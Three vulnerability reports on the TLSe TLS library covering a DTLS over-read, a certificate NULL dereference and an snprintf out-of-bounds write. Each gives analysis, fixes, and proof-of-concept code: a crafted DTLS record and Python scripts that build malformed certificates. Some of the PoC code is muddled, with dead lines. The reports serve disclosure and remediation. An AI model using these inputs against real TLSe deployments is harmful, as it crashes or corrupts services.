╭─ VULN-0009 ──────────────────────────────────────────────────────────────────╮
│                                                                              │
│  Vulnerability Report                                                        │
│                                                                              │
│  Title: DTLS short handshake record causes out-of-bounds read of the         │
│  fragment header in tls_consume_stream                                       │
│                                                                              │
│  Severity: MEDIUM                                                            │
│                                                                              │
│  CVSS Score: 5.3                                                             │
│                                                                              │
│  Target: TLSe (tlslayer) TLS library snapshot - DTLS record layer            │
│                                                                              │
│  CVSS Vector: AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L                            │
│                                                                              │
│  Description                                                                 │
│  When a DTLS handshake record carries between 1 and 11 bytes of payload,     │
│  tls_consume_stream() still reads the full 12-byte handshake fragment        │
│  header (declared length, offset and fragment length) because the guard      │
│  only requires the record to be longer than 13 bytes. Up to 11 bytes past    │
│  the end of the receive buffer are read and used as fragment bookkeeping     │
│  values, pre-authentication.                                                 │
│                                                                              │
│  Impact                                                                      │
│  A remote unauthenticated sender can make the DTLS terminator read up to 11  │
│  bytes beyond its receive buffer on each short handshake record, and those   │
│  bytes are used as the fragment's declared length, offset and length. No     │
│  data is returned to the attacker and the values are not attacker-chosen,    │
│  so the demonstrated effect is an out-of-bounds read that aborts             │
│  sanitizer-instrumented or hardened builds; in a normal build the record is  │
│  simply rejected. Standalone impact is low, but the same values feed the     │
│  fragment reassembly bookkeeping.                                            │
│                                                                              │
│  Technical Analysis                                                          │
│  In tls_consume_stream(), after the DTLS record header is validated, the     │
│  fragmentation pre-check decodes three 24-bit fields from the handshake      │
│  header:\n\n```c title=tlse.c startLineNumber=12508 endLineNumber=12516\n    │
│  if ((buffer[0] == TLS_HANDSHAKE) && (length > 13)) {\n                      │
│  ...\n                buffer += tls_header_size;\n\n                         │
│  data_length = buffer[1] * 0x10000 + buffer[2] * 0x100 + buffer[3];\n        │
│  fragment_offset = buffer[6] * 0x10000 + buffer[7] * 0x100 + buffer[8];\n    │
│  fragment_length = buffer[9] * 0x10000 + buffer[10] * 0x100 +                │
│  buffer[11];\n```\n\n`length` is the record length from the DTLS header      │
│  plus tls_header_size (13), and it has already been checked against the      │
│  bytes actually buffered. `length > 13` therefore guarantees exactly one     │
│  payload byte, while `buffer[1]`..`buffer[11]` require twelve. The bounds    │
│  check that protects the fragment body (`fragment_length + 12 > length -     │
│  tls_header_size`) runs after these reads, so it cannot prevent              │
│  them.\n\nBecause tls_consume_stream() reallocates its message buffer to     │
│  the exact number of bytes received, the over-read runs past the heap        │
│  allocation. The read values are then used for the `data_length >            │
│  DTLS_MAX_FRAGMENT_SIZE` and `fragment_offset + fragment_length >            │
│  data_length` tests, so they influence control flow, but the same record is  │
│  subsequently rejected.                                                      │
│                                                                              │
│  PoC Description                                                             │
│  1. Build a single DTLS record: type 0x16, version 0xFEFD, epoch 0,          │
│  sequence 0, payload length 1, payload byte 0x00, followed by eight more     │
│  bytes so the total allocation is 22 bytes.\n2. Deliver it to a DTLS server  │
│  context through tls_consume_stream().\n3. Because the guard is only         │
│  `length > 13` (one payload byte), the code reads buffer[1]..buffer[11] of   │
│  the assumed 12-byte handshake fragment header, which extends past the       │
│  22-byte receive buffer.\n4. The instrumented build reports                  │
│  AddressSanitizer heap-buffer-overflow READ of size 1 at tlse.c:12516, one   │
│  byte past the end of the buffer allocated at tlse.c:12462.                  │
│                                                                              │
│  PoC Code                                                                    │
│  ```python\n# 22-byte DTLS 1.2 handshake record whose payload is a single    │
│  byte:\n# tls_consume_stream then reads an 11 more bytes for the fragment    │
│  header.\nmsg =                                                              │
│  bytes.fromhex("16fefd00000040000000000001000096170304ef4503")\nassert       │
│  len(msg) == 22\nopen("dtls_short_header.bin",                               │
│  "wb").write(msg)\n```\n\nDelivery:\n\n```c\ntls_init();\nctx =              │
│  tls_create_context(1, DTLS_V12);\ntls_consume_stream(ctx, msg,              │
│  (int)sizeof(msg), NULL);   /* reads past msg */\n```                        │
│                                                                              │
│  Code Locations                                                              │
│                                                                              │
│    Location 1: tlse.c:12510                                                  │
│    Require the full 12-byte handshake fragment header before decoding it     │
│    Fix:                                                                      │
│    -             if ((buffer[0] == TLS_HANDSHAKE) && (length > 13)) {        │
│    +             if ((buffer[0] == TLS_HANDSHAKE) && (length >               │
│  tls_header_size + 12)) {                                                    │
│                                                                              │
│  Remediation                                                                 │
│  Require the complete 12-byte handshake fragment header to be present        │
│  before decoding the declared message length, fragment offset and fragment   │
│  length, i.e. check that the record payload can hold at least 12 bytes       │
│  rather than only that it is non-empty. Treat a shorter record as a broken   │
│  packet for DTLS.                                                            │
│                                                                              │
╰──────────────────────────────────────────────────────────────────────────────╯

╭─ VULN-0010 ──────────────────────────────────────────────────────────────────╮
│                                                                              │
│  Vulnerability Report                                                        │
│                                                                              │
│  Title: Stale public-key/signature length after the key is cleared leads to  │
│  a NULL pointer dereference in tls_certificate_to_string()                   │
│                                                                              │
│  Severity: MEDIUM                                                            │
│                                                                              │
│  CVSS Score: 5.9                                                             │
│                                                                              │
│  Target: TLSe (tlslayer) TLS library, `tlse.c` certificate setters           │
│                                                                              │
│  Endpoint: tls_certificate_set_key() / tls_certificate_set_sign_key()        │
│  feeding tls_certificate_to_string()                                         │
│                                                                              │
│  CVSS Vector: AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:H                            │
│                                                                              │
│  Description                                                                 │
│  `tls_certificate_set_key()` frees the certificate's previous public key     │
│  through `tls_certificate_set_copy()` but only updates `pk_len` when the     │
│  new allocation succeeds, so a certificate that sets the key twice — the     │
│  second time to an empty value — leaves `pk` NULL while `pk_len` keeps the   │
│  earlier, non-zero length. `tls_certificate_to_string()` then iterates       │
│  `cert->pk[i]` for `i < cert->pk_len` and dereferences NULL.                 │
│  `tls_certificate_set_sign_key()` has the identical defect for `sign_len`.   │
│                                                                              │
│  Impact                                                                      │
│  An attacker presenting a certificate with a duplicated or emptied key       │
│  field causes a NULL pointer dereference in the                              │
│  verifying/certificate-rendering application, aborting the process. The      │
│  effect is a denial of service against a TLSe peer or server that inspects   │
│  the certificate it received; there is no data exposure or write primitive.  │
│                                                                              │
│  Technical Analysis                                                          │
│  The parser can assign the public key more than once for a single            │
│  certificate. In `_private_asn1_parse()`, every BIT STRING that lies on the  │
│  `subjectPublicKeyInfo` field path is handed to the key setter when an EC    │
│  curve OID has already been recorded:                                        │
│                                                                              │
│  ```c title=tlse.c startLineNumber=11598 endLineNumber=11601                 │
│                      } else                                                  │
│                      if ((cert->ec_algorithm) && (_is_field(fields,          │
│  pk_id))) {                                                                  │
│                          tls_certificate_set_key(cert, &buffer[pos],         │
│  length);                                                                    │
│                      } else {                                                │
│  ```                                                                         │
│                                                                              │
│  The setter frees the old value first, and only records the new length when  │
│  a new value exists:                                                         │
│                                                                              │
│  ```c title=tlse.c startLineNumber=4581 endLineNumber=4589                   │
│  void tls_certificate_set_key(struct TLSCertificate *cert, const unsigned    │
│  char *val, int len) {                                                       │
│      if ((!val[0]) && (len % 2)) {                                           │
│          val++;                                                              │
│          len--;                                                              │
│      }                                                                       │
│      tls_certificate_set_copy(&cert->pk, val, len);                          │
│      if (cert->pk)                                                           │
│          cert->pk_len = len;                                                 │
│  }                                                                           │
│  ```                                                                         │
│                                                                              │
│  `tls_certificate_set_copy()` begins with `TLS_FREE(*member)` and takes the  │
│  `*member = NULL` branch for an empty value, so after a second call with     │
│  `len == 0` the certificate holds `pk == NULL` with `pk_len == 66`. Note     │
│  that `set_key`'s leading-zero strip is gated on `len % 2`, which is false   │
│  for zero, so the empty value reaches the copy helper unchanged — the two    │
│  setters fail differently but the stale length is the same.                  │
│                                                                              │
│  `tls_certificate_set_sign_key()` ends with the same construction for        │
│  `sign_len`, and becomes reachable by the same route once the sibling        │
│  negative-length defect is fixed. The private key, exponent and serial       │
│  setters share the pattern.                                                  │
│                                                                              │
│  `tls_certificate_to_string()` then uses the length without checking the     │
│  pointer:                                                                    │
│                                                                              │
│  ```c title=tlse.c startLineNumber=4717 endLineNumber=4719                   │
│          if (res > 0) {                                                      │
│              for (i = 0; i < cert->pk_len; i++)                              │
│                  res += snprintf(buffer + res, len - res, "%02x",            │
│  (int)cert->pk[i]);                                                          │
│  ```                                                                         │
│                                                                              │
│  giving a NULL dereference for any certificate that clears the key after     │
│  setting it. The certificate is fully attacker-controlled and the parse      │
│  succeeds, so the stale state is produced by the library itself from valid   │
│  DER.                                                                        │
│                                                                              │
│  PoC Description                                                             │
│  1. Re-encode a valid EC certificate so that the `subjectPublicKeyInfo`      │
│  SEQUENCE contains the original public-key BIT STRING followed by an         │
│  additional, empty BIT STRING (`03 00`); the DER remains valid and all       │
│  enclosing lengths stay consistent.                                          │
│  2. Parse it with `tls_certificate_parse()`: parsing succeeds, and the       │
│  resulting object has `pk = NULL` together with `pk_len = 66`, because the   │
│  second call freed the key without resetting the length.                     │
│  3. Call `tls_certificate_to_string()` with any buffer size.                 │
│  4. Observe the NULL pointer dereference at `tlse.c:4719` inside the `for    │
│  (i = 0; i < cert->pk_len; i++)` loop.                                       │
│  5. With the setter fixed to assign `pk_len` from the new pointer state,     │
│  the same input parses to `pk = NULL, pk_len = 0` and renders normally.      │
│                                                                              │
│  PoC Code                                                                    │
│  ```python                                                                   │
│  #!/usr/bin/env python3                                                      │
│  # Insert an empty BIT STRING after the subjectPublicKeyInfo public key of   │
│  a                                                                           │
│  # valid EC certificate. Re-encodes every enclosing length.                  │
│  import sys                                                                  │
│                                                                              │
│  def enc(tag, body):                                                         │
│      n = len(body)                                                           │
│      if n < 0x80:                                                            │
│          return bytes([tag, n]) + body                                       │
│      nb = n.to_bytes((n.bit_length() + 7) // 8, "big")                       │
│      return bytes([tag, 0x80 | len(nb)]) + nb + body                         │
│                                                                              │
│  def parse(b):                                                               │
│      tag, first = b[0], b[1]                                                 │
│      if first < 0x80:                                                        │
│          ln, off = first, 2                                                  │
│      else:                                                                   │
│          k = first & 0x7F                                                    │
│          ln, off = int.from_bytes(b[2:2+k], "big"), 2 + k                    │
│      content = b[off:off+ln]                                                 │
│      if tag & 0x20:                                                          │
│          kids, p = [], 0                                                     │
│          while p < len(content):                                             │
│              sub = parse(content[p:])                                        │
│              kids.append(sub)                                                │
│              p += len(enc(sub[0], sub[1]) if sub[2] is None                  │
│                       else enc(sub[0], b"".join(enc(k[0], k[1]) if k[2] is   │
│  None                                                                        │
│                                                 else b"" for k in sub[2])))  │
│          return (tag, content, kids)                                         │
│      return (tag, content, None)                                             │
│                                                                              │
│  # tree rebuild helper (children win over raw content)                       │
│  def rebuild(node):                                                          │
│      tag, content, kids = node                                               │
│      if kids is None:                                                        │
│          return enc(tag, content)                                            │
│      return enc(tag, b"".join(rebuild(k) for k in kids))                     │
│                                                                              │
│  root = parse(open(sys.argv[1], "rb").read())                                │
│                                                                              │
│  def first_bitstring_parent(node, path=()):                                  │
│      tag, content, kids = node                                               │
│      if kids is None:                                                        │
│          return None                                                         │
│      for idx, k in enumerate(kids):                                          │
│          if k[0] == 0x03:                                                    │
│              return (node, idx)                                              │
│          r = first_bitstring_parent(k)                                       │
│          if r:                                                               │
│              return r                                                        │
│      return None                                                             │
│                                                                              │
│  parent, idx = first_bitstring_parent(root)                                  │
│  parent[2].insert(idx + 1, (0x03, b"", None))   # empty BIT STRING           │
│  open(sys.argv[2], "wb").write(rebuild(root))                                │
│  print("wrote", sys.argv[2])                                                 │
│  ```                                                                         │
│                                                                              │
│  C side:                                                                     │
│                                                                              │
│  ```c                                                                        │
│  cert = tls_certificate_parse(der, der_len);       /* succeeds: pk = NULL,   │
│  pk_len = 66 */                                                              │
│  tls_certificate_to_string(cert, out, 4095);       /* NULL dereference at    │
│  tlse.c:4719 */                                                              │
│  ```                                                                         │
│                                                                              │
│  Code Locations                                                              │
│                                                                              │
│    Location 1: tlse.c:4587-4588                                              │
│    tls_certificate_set_key(): pk_len keeps the old value when the copy       │
│  freed the key                                                               │
│        if (cert->pk)                                                         │
│          cert->pk_len = len;                                                 │
│    Fix:                                                                      │
│    -     if (cert->pk)                                                       │
│          cert->pk_len = len;                                                 │
│    +     cert->pk_len = cert->pk ? len : 0;                                  │
│                                                                              │
│    Location 2: tlse.c:4603-4604                                              │
│    tls_certificate_set_sign_key(): same invariant break for sign_len         │
│        if (cert->sign_key)                                                   │
│          cert->sign_len = len;                                               │
│    Fix:                                                                      │
│    -     if (cert->sign_key)                                                 │
│          cert->sign_len = len;                                               │
│    +     cert->sign_len = cert->sign_key ? len : 0;                          │
│                                                                              │
│  Remediation                                                                 │
│  Make the pointer and the stored length change together: after copying the   │
│  value, assign the length from the new pointer state (zero when the pointer  │
│  is NULL) instead of only when the allocation succeeded. Apply the same      │
│  rule to every setter that pairs a pointer with a length in `struct          │
│  TLSCertificate` — the public key, the signature, the private key, the       │
│  exponent and the serial number. As defence in depth, have the consumers     │
│  index a certificate field only after checking that the pointer is           │
│  non-NULL, so a future invariant break cannot become a NULL dereference.     │
│                                                                              │
╰──────────────────────────────────────────────────────────────────────────────╯

╭─ VULN-0008 (updated) ────────────────────────────────────────────────────────╮
│                                                                              │
│  Vulnerability Report                                                        │
│                                                                              │
│  Title: Out-of-bounds write in tls_certificate_to_string(): negative size    │
│  passed to snprintf once the rendered peer certificate exceeds the caller's  │
│  buffer                                                                      │
│                                                                              │
│  Severity: HIGH                                                              │
│                                                                              │
│  CVSS Score: 7.5                                                             │
│                                                                              │
│  Target: TLSe (tlslayer) TLS library, `tlse.c` certificate rendering         │
│                                                                              │
│  Endpoint: tls_certificate_to_string() (public API, declared in tlse.h:234)  │
│                                                                              │
│  CVSS Vector: AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H                            │
│                                                                              │
│  Description                                                                 │
│  `tls_certificate_to_string()` accumulates the output length from            │
│  `snprintf()` return values and then uses `len - res` as the size for the    │
│  next call. Once the rendered text exceeds the caller's buffer, `res` is     │
│  greater than `len`, the subtraction yields a negative `int` that is         │
│  converted to a huge `size_t`, and `snprintf()` writes past the end of the   │
│  caller's buffer. The amount of text is derived from attacker-controlled     │
│  certificate fields, so a hostile certificate overflows a fixed-size buffer  │
│  with attacker-chosen bytes.                                                 │
│                                                                              │
│  Impact                                                                      │
│  An attacker who presents a certificate to a TLSe-based server or client     │
│  that renders the peer certificate crashes or corrupts memory in the         │
│  application process. Because the write is a formatted string built from     │
│  certificate bytes, the bytes written past the buffer are                    │
│  attacker-influenced. The demonstrated effect is an out-of-bounds write      │
│  into adjacent heap or stack memory; code execution was not demonstrated,    │
│  so the rated impact is loss of availability of the process.                 │
│                                                                              │
│  Technical Analysis                                                          │
│  The function accumulates its output position from `snprintf()` return       │
│  values:                                                                     │
│                                                                              │
│  ```c title=tlse.c startLineNumber=4612 endLineNumber=4613                   │
│      if (cert->version) {                                                    │
│          int res = snprintf(buffer, len, "X.509v%i certificate\n  Issued     │
│  by: [%s]%s (%s)\n  Issued to: [%s]%s (%s, %s)\n  Subject: %s\n  Validity:   │
│  %s - %s\n  OCSP: %s\n  Serial number: ",                                    │
│  ```                                                                         │
│                                                                              │
│  `snprintf()` returns the number of characters that *would* have been        │
│  written. When the formatted output is longer than `len`, `res` becomes      │
│  greater than `len`. Every subsequent append passes `len - res`:             │
│                                                                              │
│  ```c title=tlse.c startLineNumber=4716 endLineNumber=4719                   │
│          res += snprintf(buffer + res, len - res, "):\n");                   │
│          if (res > 0) {                                                      │
│              for (i = 0; i < cert->pk_len; i++)                              │
│                  res += snprintf(buffer + res, len - res, "%02x",            │
│  (int)cert->pk[i]);                                                          │
│  ```                                                                         │
│                                                                              │
│  `len - res` is an `int` and is negative, but the `size_t` parameter of      │
│  `snprintf()` makes it an enormous value, and the destination `buffer +      │
│  res` is already past the end of the caller's allocation. The result is a    │
│  formatted write of attacker-derived bytes at an attacker-influenced         │
│  offset.                                                                     │
│                                                                              │
│  The inputs are all remote: `pk_len` comes from the subjectPublicKeyInfo     │
│  BIT STRING or the RSA modulus INTEGER, `sign_len` from the signature BIT    │
│  STRING, `serial_len` from the serial INTEGER, and                           │
│  `subject`/`issuer_*`/`san` are copied from the certificate's name and SAN   │
│  fields with no length limit below the handshake size. The function is       │
│  exported in the public header (`tlse.h:234`) and the repository's own       │
│  example server renders the peer certificate into `char out_buffer[0xFFF]`.  │
│                                                                              │
│  Realistic sizes: a 3000-byte signature BIT STRING yields 6000 hex           │
│  characters, which alone exceeds a 4095-byte buffer. A subject common name   │
│  longer than the buffer overflows on the first `snprintf`.                   │
│                                                                              │
│  PoC Description                                                             │
│  1. Take any valid certificate and re-encode it so the outer                 │
│  `signatureValue` BIT STRING holds 3000 bytes instead of 256 (`der_tools.py  │
│  huge_sig`); the structure stays valid DER, only lengths change.             │
│  2. Parse the result with `tls_certificate_parse()` — it succeeds, and the   │
│  certificate's `sign_len` becomes 3001.                                      │
│  3. Call `tls_certificate_to_string(cert, buffer, 4095)` with the same       │
│  4095-byte buffer size that `examples/tlshelloworld.c` uses.                 │
│  4. Observe the AddressSanitizer heap-buffer-overflow: `WRITE of size 3` in  │
│  `snprintf` called from `tls_certificate_to_string` (tlse.c:4751), with the  │
│  write target beyond the end of the allocation.                              │
│  5. A certificate whose subject or issuer string is longer than the buffer   │
│  produces the same overflow on the initial format, because the first         │
│  `snprintf` alone drives `res` past `len`.                                   │
│                                                                              │
│  PoC Code                                                                    │
│  ```python                                                                   │
│  #!/usr/bin/env python3                                                      │
│  # Re-encode a valid certificate with a 3000-byte signatureValue BIT         │
│  STRING.                                                                     │
│  import sys                                                                  │
│                                                                              │
│  def enc(tag, body):                                                         │
│      n = len(body)                                                           │
│      if n < 0x80:                                                            │
│          return bytes([tag, n]) + body                                       │
│      nb = n.to_bytes((n.bit_length() + 7) // 8, "big")                       │
│      return bytes([tag, 0x80 | len(nb)]) + nb + body                         │
│                                                                              │
│  def parse(data):                                                            │
│      tag, first = data[0], data[1]                                           │
│      if first < 0x80:                                                        │
│          ln, off = first, 2                                                  │
│      else:                                                                   │
│          k = first & 0x7F                                                    │
│          ln, off = int.from_bytes(data[2:2+k], "big"), 2 + k                 │
│      content = data[off:off+ln]                                              │
│      if tag & 0x20:                                                          │
│          kids, p = [], 0                                                     │
│          while p < len(content):                                             │
│              sub = parse(content[p:])                                        │
│              kids.append(sub)                                                │
│              p += len(enc(sub[0], sub[1] if not sub[2] else                  │
│  b"".join(bytes([k[0]]) for k in [])) or b"")                                │
│          return (tag, content, kids)                                         │
│      return (tag, content, None)                                             │
│                                                                              │
│  # Simpler: operate on raw TLVs of the outer SEQUENCE only.                  │
│  def tlvs(buf):                                                              │
│      out, p = [], 0                                                          │
│      while p < len(buf):                                                     │
│          tag, first = buf[p], buf[p+1]                                       │
│          if first < 0x80:                                                    │
│              ln, off = first, p + 2                                          │
│          else:                                                               │
│              k = first & 0x7F                                                │
│              ln, off = int.from_bytes(buf[p+2:p+2+k], "big"), p + 2 + k      │
│          out.append(buf[p:off+ln])                                           │
│          p = off + ln                                                        │
│      return out                                                              │
│                                                                              │
│  der = open(sys.argv[1], "rb").read()                                        │
│  inner = tlvs(der[2:] if der[1] < 0x80 else der[2 + (der[1] & 0x7F):])       │
│  tbs, alg = inner[0], inner[1]                                               │
│  sig = bytes([0x03]) + b"\x00" + b"\x41" * 3000          # BIT STRING,       │
│  attacker-sized                                                              │
│  big = bytes([0x03, 0x80 | ((len(sig) - 2 + 2).bit_length() + 7) // 8])      │
│  # encode the new signatureValue TLV properly                                │
│  n = len(sig) - 2                                                            │
│  if n < 0x80:                                                                │
│      sig_tlv = bytes([0x03, n]) + sig[2:]                                    │
│  else:                                                                       │
│      nb = n.to_bytes((n.bit_length() + 7) // 8, "big")                       │
│      sig_tlv = bytes([0x03, 0x80 | len(nb)]) + nb + sig[2:]                  │
│  out = enc(0x30, tbs + alg + sig_tlv)                                        │
│  open(sys.argv[2], "wb").write(out)                                          │
│  print("wrote", sys.argv[2], len(out), "bytes")                              │
│  ```                                                                         │
│                                                                              │
│  The C side mirrors the bundled example:                                     │
│                                                                              │
│  ```c                                                                        │
│  cert = tls_certificate_parse(der, der_len);        /* parses fine,          │
│  sign_len = 3001 */                                                          │
│  char out_buffer[0xFFF];                            /*                       │
│  examples/tlshelloworld.c */                                                 │
│  tls_certificate_to_string(cert, out_buffer, sizeof(out_buffer));   /* OOB   │
│  write */                                                                    │
│  ```                                                                         │
│                                                                              │
│  Code Locations                                                              │
│                                                                              │
│    Location 1: tlse.c:4716-4719                                              │
│    Accumulating snprintf idiom: len - res goes negative once res > len, and  │
│  buffer + res is already out of bounds                                       │
│            res += snprintf(buffer + res, len - res, "):\n");                 │
│          if (res > 0) {                                                      │
│              for (i = 0; i < cert->pk_len; i++)                              │
│                  res += snprintf(buffer + res, len - res, "%02x",            │
│  (int)cert->pk[i]);                                                          │
│                                                                              │
│    Location 2: tlse.c:4612-4613                                              │
│    Where res first exceeds len: the header format embeds                     │
│  attacker-controlled subject/issuer/OCSP strings and the return value is     │
│  kept even when truncated                                                    │
│        if (cert->version) {                                                  │
│          int res = snprintf(buffer, len, "X.509v%i certificate\n  Issued     │
│  by: [%s]%s (%s)\n  Issued to: [%s]%s (%s, %s)\n  Subject: %s\n  Validity:   │
│  %s - %s\n  OCSP: %s\n  Serial number: ",                                    │
│                                                                              │
│  Remediation                                                                 │
│  Never use the return value of `snprintf()` as the current offset when it    │
│  may indicate truncation. Introduce a bounded append helper that takes the   │
│  buffer, the current offset and the buffer size, clamps the offset to the    │
│  buffer size, returns the buffer size once full so later appends become      │
│  no-ops, and always NUL-terminates. Replace every `res += snprintf(buffer +  │
│  res, len - res, ...)` in `tls_certificate_to_string()` with that helper,    │
│  and break out of the public-key and signature hex loops as soon as the      │
│  buffer is full. Also reject a non-positive buffer size at entry. Because    │
│  roughly forty call sites share the same idiom, the replacement must be      │
│  applied to all of them; converting only the loops that were demonstrated    │
│  leaves the subject/issuer and SAN paths able to overflow the same way.      │
│                                                                              │
